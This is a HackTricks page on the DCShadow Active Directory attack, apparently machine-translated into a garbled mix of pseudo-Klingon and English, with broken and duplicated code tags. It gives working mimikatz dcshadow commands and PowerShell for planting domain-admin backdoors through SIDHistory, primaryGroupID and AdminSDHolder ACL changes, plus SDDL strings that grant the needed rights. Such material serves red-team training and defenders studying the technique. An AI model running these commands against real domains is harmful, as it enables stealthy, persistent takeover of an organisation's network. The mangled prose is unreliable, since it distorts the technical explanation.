<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>!</strong></a> jImej</summary>

jImej vItlhutlh:

* **HackTricks** vItlhutlh **tlhIngan Hol** **company** **advertised** **want** **download HackTricks** **PDF** [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) **Check**!
* [**official PEASS & HackTricks swag**](https://peass.creator-spring.com) **Get**
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) **Discover**, [**NFTs**](https://opensea.io/collection/the-peass-family) **our collection** **exclusive**
* 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) **Join** or [**telegram group**](https://t.me/peass) **follow** **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) **and** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github repos.**

</details>


# DCShadow

**AD** vItlhutlh **new Domain Controller** **registers** **push attributes** (SIDHistory, SPNs...) **specified objects** **without** **logs** **modifications** **regarding**. **DA** **privileges** **need** **be inside** **root domain**.\
**Note** **wrong data** **use**, **pretty ugly logs** **will appear**.

**attack** **perform** **2 mimikatz instances** **need**. **One** **start the RPC servers** **SYSTEM privileges** (you **indicate** **changes** **want** **perform**), **other instance** **used** **push the values**:

{% code title="mimikatz1 (RPC servers)" %}
```bash
!+
!processtoken
lsadump::dcshadow /object:username /attribute:Description /value="My new description"
```
{% code title="mimikatz2 (push) - DA yInIDqaD" %}
```bash
lsadump::dcshadow /push
```
{% endcode %}

Notice that **`elevate::token`** won't work in `mimikatz1` session as that elevated the privileges of the thread, but we need to elevate the **privilege of the process**.\
You can also select and "LDAP" object: `/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`

You can push the changes from a DA or from a user with this minimal permissions:

* In the **domain object**:
* _DS-Install-Replica_ (Add/Remove Replica in Domain)
* _DS-Replication-Manage-Topology_ (Manage Replication Topology)
* _DS-Replication-Synchronize_ (Replication Synchornization)
* The **Sites object** (and its children) in the **Configuration container**:
* _CreateChild and DeleteChild_
* The object of the **computer which is registered as a DC**:
* _WriteProperty_ (Not Write)
* The **target object**:
* _WriteProperty_ (Not Write)

You can use [**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1) to give these privileges to an unprivileged user (notice that this will leave some logs). This is much more restrictive than having DA privileges.\
For example: `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose`  This means that the username _**student1**_ when logged on in the machine _**mcorp-student1**_ has DCShadow permissions over the object _**root1user**_.

## Using DCShadow to create backdoors

{% code title="Set Enterprise Admins in SIDHistory to a user" %}
```bash
lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-280534878-1496970234-700767426-519
```
{% code title="Chage PrimaryGroupID (put user as member of Domain Administrators)" %} 

{% code %}
Chage PrimaryGroupID (put user as member of Domain Administrators)
{% code %}
```bash
lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519
```
{% code title="Modify ntSecurityDescriptor of AdminSDHolder (give Full Control to a user)" %}

{% code %}
```
$secdesc = Get-ADObject -Identity "CN=AdminSDHolder,CN=System,DC=domain,DC=com" -Properties ntSecurityDescriptor
$acl = $secdesc.ntSecurityDescriptor
$ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList "DOMAIN\user", "FullControl", "Allow"
$acl.AddAccessRule($ace)
Set-ADObject -Identity "CN=AdminSDHolder,CN=System,DC=domain,DC=com" -Replace @{ntSecurityDescriptor=$acl}
```
{% endcode %}
```bash
#First, get the ACE of an admin already in the Security Descriptor of AdminSDHolder: SY, BA, DA or -519
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Admin SDHolder,CN=System,DC=moneycorp,DC=local")).psbase.Objec tSecurity.sddl
#Second, add to the ACE permissions to your user and push it using DCShadow
lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:<whole modified ACL>
```
{% endcode %}

## Shadowception - DCShadow permissions jImej using DCShadow (loghDaq modified permissions)

jImejbe'chugh, user SID vItlhutlhlaHbe'lu':

* Domain objectDaq:
* `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
* `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;UserSID)`
* `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
* attacker computer objectDaq: `(A;;WP;;;UserSID)`
* target user objectDaq: `(A;;WP;;;UserSID)`
* Sites objectDaq Configuration containerDaq: `(A;CI;CCDC;;;UserSID)`

objectDaq current ACE vItlhutlhlaHbe'lu': `(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=loca l")).psbase.ObjectSecurity.sddl`

DaH jImejbe'chugh, **chel** vItlhutlhlaHbe'lu' **be'nal**. So, **mimikatz1 session** (RPC server)Daq **`/stack` parameter** vIlo'laHchugh **be'nal jImejbe'chugh** vItlhutlhlaH. vaj, **`/push`** vItlhutlhlaHlaHchugh **jImejbe'chugh** vItlhutlhlaH.

[**DCShadow vItlhutlhlaH ired.teamDaq.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)


<details>

<summary><strong>AWS hacking jImej zero to hero vItlhutlhlaH</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks vItlhutlhlaHbe'chugh jImej:

* **company HackTricksDaq advertise** vItlhutlhlaHbe'lu' **tlhIngan** **download HackTricks PDF** [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) vItlhutlhlaH!
* [**official PEASS & HackTricks swag**](https://peass.creator-spring.com) vItlhutlhlaHbe'lu'
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) vItlhutlhlaHbe'lu' **NFTs** [**The PEASS Family**](https://opensea.io/collection/the-peass-family) vItlhutlhlaHbe'lu'
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) **telegram group** [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) **HackTricks Cloud** (https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
